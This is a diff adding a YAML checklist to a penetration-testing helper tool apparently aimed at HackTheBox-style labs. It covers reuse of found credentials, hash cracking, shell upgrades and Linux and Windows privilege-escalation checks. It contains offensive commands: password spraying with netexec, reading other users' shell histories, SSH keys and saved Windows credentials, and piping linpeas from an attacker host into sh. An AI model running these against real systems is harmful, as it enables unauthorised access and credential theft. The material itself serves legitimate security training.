@@ -1,0 +1,182 @@
+# Built-in methodology checklist: found credentials, and the first checks once you have a shell.
+# Shell items are commands to type on the box yourself; Cyberdeck never runs anything there.
+# Format: src/cyberdeck/core/methodology.py.
+
+- id: creds.try-everywhere
+  section: creds
+  phase: foothold
+  title: "Try every password you found on every login you know"
+  why: >
+    [[password-reuse|Password reuse]] is the most common user step on easy boxes: a database
+    password from a config file is often also an SSH or admin password.
+  how: "Web logins, ssh <user>@<ip>, SMB (netexec), WinRM. Mark where it works in Loot (m)."
+  applies: { has_credentials: true }
+  done_when: { foothold: true }
+  priority: 100
+
+- id: creds.other-users
+  section: creds
+  phase: foothold
+  title: "Try each password with every username, not just its own"
+  why: >
+    Admins reuse passwords across accounts. A found password plus the user list is a short,
+    quiet check (a handful of tries, not a brute force).
+  how: "netexec smb <ip> -u loot/users.txt -p '<password>' --continue-on-success"
+  applies: { has_credentials: true, has_users: true }
+  priority: 75
+
+- id: creds.hash-identify
+  section: creds
+  phase: foothold
+  title: "Identify each hash's type"
+  why: >
+    Cracking needs the right mode ([[hash-cracking]]). bcrypt ($2y$), MD5 (32 hex), NTLM and
+    sha512crypt ($6$) are the usual ones on HTB.
+  how: "r > hashid, or hashcat --identify hash.txt"
+  applies: { has_hashes: true }
+  done_when: { tools_done: [hashid] }
+  tool: hashid
+  priority: 90
+
+- id: creds.hash-crack
+  section: creds
+  phase: foothold
+  title: "Crack the hashes with rockyou"
+  why: >
+    HTB passwords are chosen to be crackable with [[rockyou|rockyou.txt]] in minutes. If one
+    doesn't crack, it probably isn't the intended path.
+  how: "hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt  (or john --wordlist=...)"
+  applies: { has_hashes: true }
+  priority: 85
+
+- id: shell.upgrade
+  section: linux-shell
+  phase: privesc
+  title: "Upgrade your shell to a proper terminal"
+  why: >
+    A raw [[reverse-shell]] breaks on Ctrl+C and can't run sudo or su. A full TTY makes every
+    later step easier.
+  how: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  then Ctrl+Z, stty raw -echo; fg, export TERM=xterm"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 95
+
+- id: shell.who
+  section: linux-shell
+  phase: privesc
+  title: "Check who you are and which groups you're in"
+  why: >
+    Groups like docker, lxd, disk, adm or sudo are each a known way to root
+    ([[privilege-escalation]]).
+  how: "id; hostname; cat /etc/passwd | grep sh$"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 90
+
+- id: shell.sudo
+  section: linux-shell
+  phase: privesc
+  title: "Run sudo -l as every user you get"
+  why: >
+    Anything you may run as root ([[sudo]]) is the first place to look. Read its source if
+    it's a script; look it up on [[gtfobins|GTFOBins]] if it's a normal program.
+  how: "sudo -l"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 100
+
+- id: shell.config-files
+  section: linux-shell
+  phase: privesc
+  title: "Read the web app's config files for passwords"
+  why: >
+    The database password in the web root is often reused by a real user
+    ([[password-reuse]]). It's the classic www-data to user step.
+  how: "ls -la /var/www/ ; grep -riE 'pass|pwd|secret' /var/www/ /opt/ 2>/dev/null | head -50"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 92
+
+- id: shell.homes
+  section: linux-shell
+  phase: privesc
+  title: "Look in home directories"
+  why: >
+    Readable .bash_history, .ssh/ keys, notes and scripts in other users' homes are common
+    hints. user.txt is usually in one of them.
+  how: "ls -la /home/*; cat /home/*/.bash_history 2>/dev/null; find / -name id_rsa 2>/dev/null"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 85
+
+- id: shell.suid
+  section: linux-shell
+  phase: privesc
+  title: "List SUID programs and look up the unusual ones"
+  why: >
+    A program that runs as root for everyone ([[suid]]) and isn't a normal system one is a
+    likely way up. Check [[gtfobins|GTFOBins]].
+  how: "find / -perm -4000 -type f 2>/dev/null"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 80
+
+- id: shell.ports
+  section: linux-shell
+  phase: privesc
+  title: "Check for services that only listen inside the box"
+  why: >
+    A web app or database on 127.0.0.1 was invisible to your scan. It's often the next step,
+    reached with an SSH tunnel.
+  how: "ss -tlnp  (then: ssh -L 8000:127.0.0.1:<port> <user>@<ip>)"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 75
+
+- id: shell.cron
+  section: linux-shell
+  phase: privesc
+  title: "Look for scheduled jobs and what root runs"
+  why: >
+    A script root runs every minute that you can edit (or whose files you control) is a
+    straight path to root.
+  how: "cat /etc/crontab; ls -la /etc/cron.*; ps aux | grep root  (pspy shows short-lived jobs)"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 70
+
+- id: shell.linpeas
+  section: linux-shell
+  phase: privesc
+  title: "Run an enumeration script once you've done the manual checks"
+  why: >
+    linpeas checks hundreds of things at once. Do the manual checks first so you learn what
+    it's telling you, then read its red/yellow lines.
+  how: "Serve linpeas.sh from Kali (python3 -m http.server), then on the box: curl http://<LHOST>:8000/linpeas.sh | sh"
+  applies: { foothold: true, not_os: [windows] }
+  priority: 50
+
+- id: winshell.privs
+  section: windows-shell
+  phase: privesc
+  title: "Check your privileges and groups"
+  why: >
+    Privileges like SeImpersonate or SeBackup, or groups like Backup Operators, are known
+    routes to Administrator ([[privilege-escalation]]).
+  how: "whoami /all"
+  applies: { foothold: true, os: [windows] }
+  priority: 100
+
+- id: winshell.files
+  section: windows-shell
+  phase: privesc
+  title: "Look for saved credentials and interesting files"
+  why: >
+    Saved credentials, PowerShell history and config files with passwords are common on
+    Windows boxes.
+  how: "cmdkey /list; type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt; dir C:\\ -Force"
+  applies: { foothold: true, os: [windows] }
+  priority: 90
+
+- id: winshell.services
+  section: windows-shell
+  phase: privesc
+  title: "Check installed programs and services"
+  why: >
+    Third-party software in C:\Program Files and services running as SYSTEM are often the
+    intended weak spot. Look up their versions.
+  how: "dir 'C:\\Program Files', 'C:\\Program Files (x86)'; Get-Service"
+  applies: { foothold: true, os: [windows] }
+  priority: 80
